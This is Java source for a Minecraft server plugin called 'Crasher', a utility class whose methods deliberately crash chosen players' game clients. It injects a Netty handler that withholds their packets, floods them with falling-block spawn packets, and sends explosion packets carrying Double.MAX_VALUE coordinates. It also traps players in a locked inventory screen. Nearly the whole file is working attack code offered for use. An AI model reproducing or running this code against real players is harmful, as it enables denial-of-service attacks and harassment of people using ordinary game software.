package cn.xuexu.crasher.utils;

import cn.xuexu.crasher.Crasher;
import cn.xuexu.crasher.bstats.Metrics;
import cn.xuexu.crasher.commands.Crash;
import cn.xuexu.crasher.listener.PlayerListener;
import cn.xuexu.crasher.tasks.CheckUpdate;
import io.netty.channel.Channel;
import io.netty.channel.ChannelDuplexHandler;
import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.ChannelPromise;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Player;
import org.bukkit.event.inventory.InventoryType;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemFlag;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.scheduler.BukkitTask;

import java.io.File;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.*;
import java.util.stream.Collectors;

public final class Utils {
    public final static Map<UUID, Queue<Object>> packetQueues = new HashMap<>();
    public final static Map<UUID, Queue<Object>> packetReviveQueues = new HashMap<>();
    public final static Set<UUID> crashSet = new HashSet<>();
    public final static Set<UUID> frozenSet = new HashSet<>();
    public static Crasher instance;

    public static String serverVersion;

    public static Metrics metrics;

    public Utils(final Crasher instance) {
        registerInstance(instance);
        instance.saveResource("eula.txt", false);
        final FileConfiguration eulaConfig = YamlConfiguration.loadConfiguration(new File(instance.getDataFolder(), "eula.txt"));
        if (!eulaConfig.getBoolean("eula")) {
            instance.getLogger().info("您同意eula.txt, 若您同意需要将eula: false改为eula: true");
            Bukkit.shutdown();
            System.exit(0);
            return;
        }
        instance.getLogger().info("Your server version: " + Utils.getServerVersion());
        if (!Utils.getServerVersion().equals("v1_8_R3")) {
            instance.getLogger().severe("Your server version is not support! [?Plugin has unknown bug?]");
            instance.getLogger().warning("If you are using1.20+ server version will not support!");
        }
        if (instance.getConfig().getBoolean("Debug.bStats")) {
            metrics = new Metrics(instance, 20432);
        }
    }

    public static void setupPlugin() {
        instance.saveDefaultConfig();
        if (!instance.getDescription().getVersion().equals(instance.getConfig().getString("Debug.CfgVer"))) {
            instance.getLogger().warning("Your config version is not support! Config Version: " + instance.getConfig().getString("CfgVer"));
        }
        Bukkit.getPluginManager().registerEvents(new PlayerListener(), instance);
        instance.getCommand("Crash").setExecutor(new Crash());
        instance.getCommand("Crash").setTabCompleter(new Crash());
        final BukkitTask task = new CheckUpdate().runTaskTimerAsynchronously(instance, 0L, 72000L);
    }

    public static void frozenPlayer(final Player player) {
        if (frozenSet.contains(player.getUniqueId())) {
            instance.getLogger().severe("ERROR CODE: 0003. IS OTHER PLUGIN USEING API?");
            if (!player.getOpenInventory().getTitle().equals(ChatColor.translateAlternateColorCodes('&', Utils.instance.getConfig().getString("Messages.FrozenGUITitle"))) || !player.getOpenInventory().getType().equals(InventoryType.CHEST)) {
                instance.getLogger().severe("ERROR CODE: 0004. IS OTHER PLUGIN USEING API?");
            }
        }
        player.openInventory(frozenInventory(player));
        Utils.frozenSet.add(player.getUniqueId());
    }

    public static Inventory frozenInventory(final Player player) {
        final Inventory frozenInventory = Bukkit.createInventory(player, instance.getConfig().getInt("Settings.Frozen.FrozenGUISize"), ChatColor.translateAlternateColorCodes('&', instance.getConfig().getString("Messages.FrozenGUITitle")));
        final ItemStack itemStack = new ItemStack(Material.getMaterial(instance.getConfig().getString("Settings.Frozen.FrozenGUIItem")), instance.getConfig().getInt("Settings.Frozen.FrozenGUIItemAmount"), Short.valueOf(instance.getConfig().getString("Settings.Frozen.FrozenGUIItemDamage")), Byte.valueOf(instance.getConfig().getString("Settings.Frozen.FrozenGUIItemByte")));
        final ItemMeta itemMeta = itemStack.getItemMeta();
        if (instance.getConfig().getBoolean("Settings.Frozen.FrozenGUIItemEnchant")) {
            itemStack.addUnsafeEnchantment(Enchantment.DURABILITY, 3);
            itemMeta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
        }
        itemMeta.setDisplayName(ChatColor.translateAlternateColorCodes('&', instance.getConfig().getString("Messages.FrozenGUIItemName")));
        final List<String> colorList = instance.getConfig().getStringList("Messages.FrozenGUIItemLores").stream()
                .map(configList -> ChatColor.translateAlternateColorCodes('&', configList))
                .collect(Collectors.toList());
        itemMeta.setLore(colorList);
        itemStack.setItemMeta(itemMeta);
        for (int i = 0; i <= instance.getConfig().getInt("Settings.Frozen.FrozenGUISize") - 1; i++) {
            frozenInventory.setItem(i, itemStack);
        }
        return frozenInventory;
    }

    public static void addCrashSet(final UUID uuid) {
        if (Bukkit.getPlayer(uuid) != null) {
            final Player player = Bukkit.getPlayer(uuid);
            addPacketListener(player);
            crashSet.add(uuid);
            /*Here bugged
            if (Bukkit.isPrimaryThread()) {*/
            new BukkitRunnable() {
                @Override
                public void run() {
                    player.kickPlayer(ChatColor.translateAlternateColorCodes('&', instance.getConfig().getString("Messages.TImeOutKick")));

                }
            }.runTask(instance);
            /*} else {
                player.kickPlayer("time out");
            }*/
        }
    }

    public static void addCrashSet(final UUID uuid, final Object dontKick) {
        if (Bukkit.getPlayer(uuid) != null) {
            addPacketListener(Bukkit.getPlayer(uuid));
            crashSet.add(uuid);
        }
    }

    public static void removeCrashSet(final UUID uuid) {
        if (Bukkit.getPlayer(uuid) != null) {
            final Player player = Bukkit.getPlayer(uuid);
            removePacketListener(player);
            crashSet.remove(uuid);
            if (instance.getConfig().getBoolean("Settings.CancelPackets.CancelPacketsResend")) {
                reviveQueuedPackets(player);
                sendQueuedPackets(player);
            }
        } else {
            instance.getLogger().severe("ERROR CODE: 0002. IS OTHER PLUGING USEING API?");
        }
    }

    public static void crashPlayer(final Player player, final int type) {
        switch (type) {
            case 1:
                if (!crashSet.contains(player.getUniqueId())) {
                    if (instance.getConfig().getBoolean("Settings.CancelPackets.CancelPacketsKick")) {
                        addCrashSet(player.getUniqueId(), "Dont Kick");
                    } else {
                        addCrashSet(player.getUniqueId());
                    }
                } else {
                    removeCrashSet(player.getUniqueId());
                    instance.getLogger().severe("ERROR CODE: 0001. IS OTHER PLUGIN USEING API?");
                }
                break;
            case 2:
                try {
                    final Class<?> craftPlayerClass = Class.forName("org.bukkit.craftbukkit." + getServerVersion() + ".entity.CraftPlayer");
                    final Object entityPlayer = craftPlayerClass.getMethod("getHandle").invoke(craftPlayerClass.cast(player));
                    final Object playerConnection = entityPlayer.getClass().getField("playerConnection").get(entityPlayer);
                    final Object world = entityPlayer.getClass().getField("world").get(entityPlayer);
                    final Location location = player.getLocation();
                    final double x = location.getX();
                    final double y = location.getY() + 1.5;
                    final double z = location.getZ();
                    final Field barrierField = Class.forName("net.minecraft.server." + getServerVersion() + ".Blocks").getField("BARRIER");
                    final Object blockData = barrierField.getType().getMethod("getBlockData").invoke(barrierField.get(null));
                    final int materialId = Material.BARRIER.getId();
                    final Constructor<?> entityConstructor = Class.forName("net.minecraft.server." + getServerVersion() + ".EntityFallingBlock").getConstructor(Class.forName("net.minecraft.server." + getServerVersion() + ".World"), double.class, double.class, double.class, Class.forName("net.minecraft.server." + getServerVersion() + ".IBlockData"));
                    final Constructor<?> packetConstructor = Class.forName("net.minecraft.server." + getServerVersion() + ".PacketPlayOutSpawnEntity").getConstructor(Class.forName("net.minecraft.server." + getServerVersion() + ".Entity"), int.class, int.class);
                    final Method sendPacketMethod = playerConnection.getClass().getMethod("sendPacket", Class.forName("net.minecraft.server." + getServerVersion() + ".Packet"));
                    new BukkitRunnable() {
                        @Override
                        public void run() {
                            try {
                                for (int i = 0; i <= instance.getConfig().getInt("Settings.EntitysCrash.PacketLimit"); i++) {
                                    final Object packet = packetConstructor.newInstance(entityConstructor.newInstance(world, x, y, z, blockData), 70, materialId);
                                    sendPacketMethod.invoke(playerConnection, packet);
                                }
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                            if (instance.getConfig().getBoolean("Settings.EntitysCrash.CancelKick")) {
                                addCrashSet(player.getUniqueId(), "Dont Kick");
                            } else {
                                addCrashSet(player.getUniqueId());
                            }
                        }
                    }.runTaskAsynchronously(instance);
                } catch (Exception e) {
                    e.printStackTrace();
                }
                break;
            case 3:
                try {
                    final Class<?> craftPlayerClass = Class.forName("org.bukkit.craftbukkit." + getServerVersion() + ".entity.CraftPlayer");
                    final Object entityPlayer = craftPlayerClass.getMethod("getHandle").invoke(craftPlayerClass.cast(player));
                    final Object playerConnection = entityPlayer.getClass().getField("playerConnection").get(entityPlayer);
                    final Object Vec3D = Class.forName("net.minecraft.server." + getServerVersion() + ".Vec3D").getConstructor(double.class, double.class, double.class).newInstance(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE);
                    final Constructor<?> packetConstructor = Class.forName("net.minecraft.server." + getServerVersion() + ".PacketPlayOutExplosion").getConstructor(double.class, double.class, double.class, float.class, List.class, Class.forName("net.minecraft.server." + getServerVersion() + ".Vec3D"));
                    final Method sendPacketMethod = playerConnection.getClass().getMethod("sendPacket", Class.forName("net.minecraft.server." + getServerVersion() + ".Packet"));
                    new BukkitRunnable() {
                        @Override
                        public void run() {
                            try {
                                for (int i = 0; i <= instance.getConfig().getInt("Settings.ExplosionsCrash.PacketLimit"); i++) {
                                    final Object packet = packetConstructor.newInstance(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Collections.emptyList(), Vec3D);
                                    sendPacketMethod.invoke(playerConnection, packet);
                                }
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                            if (instance.getConfig().getBoolean("Settings.ExplosionsCrash.CancelKick")) {
                                addCrashSet(player.getUniqueId(), "Dont Kick");
                            } else {
                                addCrashSet(player.getUniqueId());
                            }
                        }
                    }.runTaskAsynchronously(instance);
                } catch (Exception e) {
                    e.printStackTrace();
                }
                break;
        }
    }

    public static void queuePacket(final Player player, final Object packet) {
        packetQueues.computeIfAbsent(player.getUniqueId(), k -> new LinkedList<>()).add(packet);
    }

    public static void queueRevivePacket(final Player player, final Object packet) {
        packetReviveQueues.computeIfAbsent(player.getUniqueId(), k -> new LinkedList<>()).add(packet);
    }

    public static void sendQueuedPackets(final Player player) {
        final Queue<Object> playerQueue = packetQueues.getOrDefault(player.getUniqueId(), null);
        if (playerQueue == null) {
            return;
        }
        try {
            final Class<?> craftPlayerClass = Class.forName("org.bukkit.craftbukkit." + getServerVersion() + ".entity.CraftPlayer");
            final Object entityPlayer = craftPlayerClass.getMethod("getHandle").invoke(craftPlayerClass.cast(player));
            final Object playerConnection = entityPlayer.getClass().getField("playerConnection").get(entityPlayer);
            final Method sendPacketMethod = playerConnection.getClass().getMethod("sendPacket", Class.forName("net.minecraft.server." + getServerVersion() + ".Packet"));
            for (final Object packet : playerQueue) {
                sendPacketMethod.invoke(playerConnection, packet);
                if (instance.getConfig().getBoolean("Debug.PacketListener.mode")) {
                    instance.getLogger().info("DEBUG-PACKET-SEND: " + packet);
                }
            }
        } catch (NoSuchFieldException | ClassNotFoundException | InvocationTargetException |
                 IllegalAccessException | NoSuchMethodException e) {
            e.printStackTrace();
        }
        playerQueue.clear();
    }

    public static void reviveQueuedPackets(final Player player) {
        final Queue<Object> playerReviveQueue = packetReviveQueues.getOrDefault(player.getUniqueId(), null);
        if (playerReviveQueue == null) {
            return;
        }
        try {
            final Class<?> craftPlayerClass = Class.forName("org.bukkit.craftbukkit." + getServerVersion() + ".entity.CraftPlayer");
            final Object entityPlayer = craftPlayerClass.getMethod("getHandle").invoke(craftPlayerClass.cast(player));
            final Object playerConnection = entityPlayer.getClass().getField("playerConnection").get(entityPlayer);
            for (final Object packet : playerReviveQueue) {
                final String[] className = packet.getClass().getName().split("\\$");
                if (className[0].endsWith("PacketPlayInChat")) {
                    playerConnection.getClass().getMethod("chat", String.class, boolean.class).invoke(playerConnection, packet.getClass().getMethod("a").invoke(packet), false);
                }
                playerConnection.getClass().getDeclaredMethod("a", Class.forName(className[0])).invoke(playerConnection, packet);
                if (instance.getConfig().getBoolean("Debug.PacketListener.mode")) {
                    instance.getLogger().info("DEBUG-PACKET-REVIVE: " + packet);
                }
            }
        } catch (NoSuchFieldException | ClassNotFoundException |
                 IllegalAccessException | NoSuchMethodException e) {
            e.printStackTrace();
        } catch (InvocationTargetException ignored) {
        }
        playerReviveQueue.clear();
    }

    public static void addPacketListener(final Player player) {
        if (player == null) {
            return;
        }
        try {
            final Class<?> craftPlayerClass = Class.forName("org.bukkit.craftbukkit." + getServerVersion() + ".entity.CraftPlayer");
            final Object entityPlayer = craftPlayerClass.getMethod("getHandle").invoke(craftPlayerClass.cast(player));
            final Object playerConnection = entityPlayer.getClass().getField("playerConnection").get(entityPlayer);
            final Object networkManager = playerConnection.getClass().getField("networkManager").get(playerConnection);
            final Channel channel = (Channel) networkManager.getClass().getField("channel").get(networkManager);
            channel.pipeline().addBefore("packet_handler", "cancel_packets", new ChannelDuplexHandler() {
                @Override
                public void channelRead(final ChannelHandlerContext ctx, final Object msg) throws Exception {
                    if (!Utils.crashSet.contains(player.getUniqueId()) & msg.getClass().getSimpleName().equals("PacketPlayInKeepAlive") | msg.getClass().getSimpleName().equals("PacketPlayOutKeepAlive")) {
                        super.channelRead(ctx, msg);
                    } else {
                        queueRevivePacket(player, msg);
                    }
                    if (instance.getConfig().getBoolean("Debug.PacketListener.mode")) {
                        instance.getLogger().info("DEBUG-PACKET READER: " + msg);
                    }
                }

                @Override
                public void write(final ChannelHandlerContext ctx, final Object msg, final ChannelPromise promise) throws Exception {
                    if (!Utils.crashSet.contains(player.getUniqueId()) & msg.getClass().getSimpleName().equals("PacketPlayInKeepAlive") | msg.getClass().getSimpleName().equals("PacketPlayOutKeepAlive")) {
                        super.write(ctx, msg, promise);
                    } else if (instance.getConfig().getBoolean("Settings.CancelPackets.CancelPacketsResend")) {
                        queuePacket(player, msg);
                    }
                    if (instance.getConfig().getBoolean("Debug.PacketListener.mode")) {
                        instance.getLogger().info("DEBUG-PACKET WRITER: " + msg);
                    }
                }
            });
        } catch (NoSuchFieldException | InvocationTargetException | IllegalAccessException | NoSuchMethodException |
                 ClassNotFoundException e) {
            e.printStackTrace();
        }
    }

    public static void removePacketListener(final Player player) {
        if (player == null) {
            return;
        }
        try {
            final Class<?> craftPlayerClass = Class.forName("org.bukkit.craftbukkit." + getServerVersion() + ".entity.CraftPlayer");
            final Object entityPlayer = craftPlayerClass.getMethod("getHandle").invoke(craftPlayerClass.cast(player));
            final Object playerConnection = entityPlayer.getClass().getField("playerConnection").get(entityPlayer);
            final Object networkManager = playerConnection.getClass().getField("networkManager").get(playerConnection);
            final Channel channel = (Channel) networkManager.getClass().getField("channel").get(networkManager);
            if (channel.pipeline().get("cancel_packets") != null) {
                channel.eventLoop().execute(() -> {
                    channel.pipeline().remove("cancel_packets");
                });
            }
        } catch (NoSuchFieldException | InvocationTargetException | IllegalAccessException | NoSuchMethodException |
                 ClassNotFoundException e) {
            e.printStackTrace();
        }
    }


    public static String getServerVersion() {
        if (serverVersion == null) {
            serverVersion = Bukkit.getServer().getClass().getPackage().getName().split("\\.")[3];
        }
        return serverVersion;
    }

    public static void unregisterInstance() {
        Utils.crashSet.stream().parallel()
                .forEach(uuid -> {
                    Utils.removeCrashSet(uuid);
                    if (Bukkit.getPlayer(uuid) != null) {
                        Utils.removePacketListener(Bukkit.getPlayer(uuid));
                    }
                });
        packetReviveQueues.clear();
        packetQueues.clear();
        crashSet.clear();
        frozenSet.clear();
        if (metrics != null) {
            metrics.shutdown();
            metrics = null;
        }
        serverVersion = null;
        Utils.instance = null;
    }

    public void registerInstance(final Crasher instance) {
        Utils.instance = instance;
    }
}
